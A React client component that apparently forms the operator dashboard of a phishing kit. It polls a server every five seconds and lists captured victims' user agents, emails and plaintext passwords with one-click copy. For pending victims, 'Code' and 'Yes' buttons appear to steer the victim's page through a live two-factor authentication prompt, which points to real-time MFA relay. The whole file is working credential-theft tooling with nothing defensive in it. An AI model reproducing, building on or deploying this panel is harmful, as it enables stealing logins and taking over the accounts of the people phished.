"use client";
import { changeState, getAllData } from "@/actions";
import { useEffect, useState } from "react";
import { useToast } from "./ui/use-toast";

export default function DashboardDataTable() {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [pending, setPending] = useState({
    state: false,
    index: 0,
  });
  function copyToClipboard(text) {
    var input = document.createElement("input");
    input.value = text;
    document.body.appendChild(input);
    input.select();
    document.execCommand("copy");
    document.body.removeChild(input);
  }
  async function getData() {
    setLoading(true);
    let res = await getAllData();
    if (res) {
      setData(JSON.parse(res)["data"].reverse());
    }
    setLoading(false);
  }
  const { toast } = useToast();
  useEffect(() => {
    getData();
    setInterval(getData, 5000);
  }, []);
  if (!data) {
    return (
      <tbody>
        <tr className="text-center">
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
          <td className="border px-4 py-2">loading...</td>
        </tr>
      </tbody>
    );
  }
  if (data.length == 0) {
    return (
      <tbody>
        <tr className="text-center">
          <td colSpan={4} className="border px-4 text-red-500  py-2">
            No Data
          </td>
        </tr>
      </tbody>
    );
  }
  return (
    <tbody>
      {loading && (
        <div className="absolute  text-xl top-5 left-1/2">Loading ..</div>
      )}
      {data.map((item, index) => (
        <tr key={index}>
          <td
            onClick={() => {
              toast({
                description: "User Agent copied to clipboard",
              });
              copyToClipboard(item.userAgent);
            }}
            className="border cursor-pointer px-4 py-2"
          >
            {item.userAgent}
          </td>
          <td
            onClick={() => {
              toast({
                description: "Email copied to clipboard",
              });
              copyToClipboard(item.email);
            }}
            className="border cursor-pointer px-4 py-2"
          >
            {item.email}
          </td>
          <td
            onClick={() => {
              toast({
                description: "Password copied to clipboard",
              });
              copyToClipboard(item.password);
            }}
            className="border cursor-pointer px-4 py-2"
          >
            {item.password}
          </td>
          {item.state === "pending" ? (
            <td className="border px-4 py-2 min-w-10">
              <div className="flex items-center justify-center   gap-2">
                {pending.state && pending.index == index ? (
                  <div>Pending..</div>
                ) : (
                  <>
                    <button
                      onClick={async () => {
                        setPending({
                          state: true,
                          index: index,
                        });
                        let code = prompt("code");
                        await changeState(item._id, "code", code);
                        await getData();
                        setPending({
                          state: false,
                        });
                      }}
                      className="bg-blue-600 rounded-3xl py-1 px-3"
                    >
                      Code
                    </button>
                    <button
                      onClick={async () => {
                        setPending({
                          state: true,
                          index: index,
                        });
                        await changeState(item._id, "yes");
                        await getData();
                        setPending({
                          state: false,
                        });
                      }}
                      className="bg-blue-600 rounded-3xl py-1 px-3"
                    >
                      Yes
                    </button>
                  </>
                )}
              </div>
            </td>
          ) : (
            <td className="border px-4 py-2 min-w-10 ">{item.state}</td>
          )}
          {/* {item.state === "pending" ? (
            <td className="border px-4 py-2 flex flex-col gap-1">
              {pending ? (
                <div className="text-red-500">pending...</div>
              ) : (
                <>
                  <button
                    onClick={async () => {
                      setPending(true);
                      let code = prompt("code");
                      await changeState(item._id, "code", code);
                      getData();
                      setPending(false);
                    }}
                    disabled={pending}
                    className="bg-blue-700 py-2 px-5 rounded-3xl text-white"
                  >
                    {"code"}
                  </button>
                  <button
                    onClick={async () => {
                      setPending(true);
                      await changeState(item._id, "yes");
                      getData();
                      setPending(false);
                    }}
                    disabled={pending}
                    className="bg-blue-700 py-2 px-5 rounded-3xl text-white"
                  >
                    {"yes"}
                  </button>
                </>
              )}
            </td>
          ) : (
            <td className="border px-4 py-2">{item.state}</td>
          )} */}
        </tr>
      ))}
    </tbody>
  );
}
